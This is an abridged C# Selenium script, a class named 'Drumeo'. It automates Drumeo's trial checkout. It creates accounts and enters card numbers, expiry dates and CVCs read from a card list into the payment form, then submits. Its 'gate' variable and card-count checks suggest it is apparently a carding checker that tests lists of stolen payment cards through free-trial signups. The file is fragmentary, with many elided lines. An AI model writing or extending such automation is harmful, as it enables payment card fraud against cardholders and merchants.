    ...
    class Drumeo
    {
        ...
        public void load()
        {
            ...
            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
            {
                ...
                driver.Url = "https://www.drumeo.com/laravel/public/shopping-cart/api/query?products[DLM-Trial]=1,month,1&locked=true";
                Thread.Sleep(1000);
                ...
                try
                {
                    if (tiempoElemento(By.Id("newAccountEmail")))
                    {
                        driver.FindElementById("newAccountEmail").SendKeys(correo);
                        Thread.Sleep(1000);
                        driver.FindElementById("newAccountPassword").SendKeys(clave);
                        Thread.Sleep(1000);
                    ...
                    if (pagos < 12)
                    {
                        ...
                        if (tiempoElemento(By.XPath("//*[@id='card-number']/div/iframe")))
                        {
                            ...
                            if (tiempoElemento(By.XPath("//*[@id='card-expiry']/div/iframe")))
                            {
                                ...
                                driver.FindElementByName("exp-date").SendKeys(ccLine[1]);
                                Thread.Sleep(500);
                                driver.FindElementByName("exp-date").SendKeys(ccLine[2].Remove(0, 2));
                                Thread.Sleep(500);
                                driver.SwitchTo().ParentFrame();
                                Thread.Sleep(500);
                                if (tiempoElemento(By.XPath("//*[@id='card-cvc']/div/iframe")))
                                {
                                    ...
                                    if (tiempoElemento(By.XPath("//*[@id='app']/div[2]/div/div[2]/button")))
                                    {
                                        driver.FindElementByXPath("//*[@id='app']/div[2]/div/div[2]/button").Click();
                                        Thread.Sleep(1000);
                                    }
                                    else
                                    {
